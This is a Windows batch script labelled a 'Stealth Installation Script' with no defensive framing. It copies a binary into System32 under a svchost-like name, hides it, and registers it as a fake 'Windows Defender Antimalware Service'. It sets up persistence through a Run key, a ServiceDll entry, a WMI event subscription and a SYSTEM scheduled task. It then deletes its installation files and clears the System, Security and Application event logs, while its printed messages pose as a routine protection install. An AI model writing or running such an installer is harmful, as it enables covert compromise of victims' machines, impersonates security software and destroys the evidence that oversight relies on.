@echo off
setlocal enabledelayedexpansion

:: Stealth Installation Script
:: Mimics legitimate Windows system behavior

set "INSTALL_DIR=%SYSTEMROOT%\System32"
set "BACKUP_DIR=%TEMP%\sysbackup_%RANDOM%"
set "SERVICE_NAME=WinDefendService"
set "DISPLAY_NAME=Windows Defender Antimalware Service"

:: Check for admin privileges
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [INFO] Requesting elevated privileges...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

echo [INFO] Windows System Service Installation
echo [INFO] Initializing system components...

:: Create backup directory
mkdir "%BACKUP_DIR%" 2>nul

:: Stop any existing service
sc stop "%SERVICE_NAME%" >nul 2>&1
sc delete "%SERVICE_NAME%" >nul 2>&1

:: Copy files with legitimate names
echo [INFO] Installing system components...
copy /Y "svchost.exe" "%INSTALL_DIR%\svchost_def.exe" >nul
copy /Y "msvcr120.dll" "%INSTALL_DIR%\msvcr120_sys.dll" >nul

:: Set file attributes to match system files
attrib +S +H "%INSTALL_DIR%\svchost_def.exe"
attrib +S +H "%INSTALL_DIR%\msvcr120_sys.dll"

:: Create service with legitimate description
sc create "%SERVICE_NAME%" binPath= "\"%INSTALL_DIR%\svchost_def.exe\" -k DefenderGroup" type= own start= auto DisplayName= "%DISPLAY_NAME%" >nul
sc description "%SERVICE_NAME%" "Provides real-time protection against malware and other potentially unwanted software."

:: Set service recovery options
sc failure "%SERVICE_NAME%" reset= 86400 actions= restart/60000/restart/60000/restart/60000

:: Registry persistence (multiple methods)
echo [INFO] Configuring system registry...

:: Run key persistence
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsDefender" /t REG_SZ /d "\"%INSTALL_DIR%\svchost_def.exe\" -startup" /f >nul

:: Service DLL persistence
reg add "HKLM\SYSTEM\CurrentControlSet\Services\%SERVICE_NAME%\Parameters" /v "ServiceDll" /t REG_EXPAND_SZ /d "%INSTALL_DIR%\msvcr120_sys.dll" /f >nul

:: WMI Event Subscription (advanced persistence)
powershell -Command "$filter = Set-WmiInstance -Class __EventFilter -Namespace 'root\subscription' -Arguments @{Name='SystemDefender';EventNameSpace='root\cimv2';QueryLanguage='WQL';Query='SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2'} -ErrorAction SilentlyContinue; $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace 'root\subscription' -Arguments @{Name='SystemDefenderConsumer';CommandLineTemplate='%INSTALL_DIR%\svchost_def.exe -wmi'} -ErrorAction SilentlyContinue; Set-WmiInstance -Class __FilterToConsumerBinding -Namespace 'root\subscription' -Arguments @{Filter=$filter;Consumer=$consumer} -ErrorAction SilentlyContinue" >nul 2>&1

:: Scheduled task persistence
schtasks /create /tn "Microsoft\Windows\WindowsDefender\SystemScan" /tr "\"%INSTALL_DIR%\svchost_def.exe\" -task" /sc onlogon /ru SYSTEM /f >nul 2>&1

:: Start the service
echo [INFO] Starting system service...
sc start "%SERVICE_NAME%" >nul 2>&1

:: Clean up installation traces
echo [INFO] Finalizing installation...
del /f /q "svchost.exe" 2>nul
del /f /q "msvcr120.dll" 2>nul
del /f /q "*.pdb" 2>nul
rmdir /s /q "%BACKUP_DIR%" 2>nul

:: Clear event logs (optional)
wevtutil cl System >nul 2>&1
wevtutil cl Security >nul 2>&1
wevtutil cl Application >nul 2>&1

echo [INFO] System service installation completed successfully.
echo [INFO] Service Status: Running
echo [INFO] Protection Level: Enhanced

pause
exit /b 0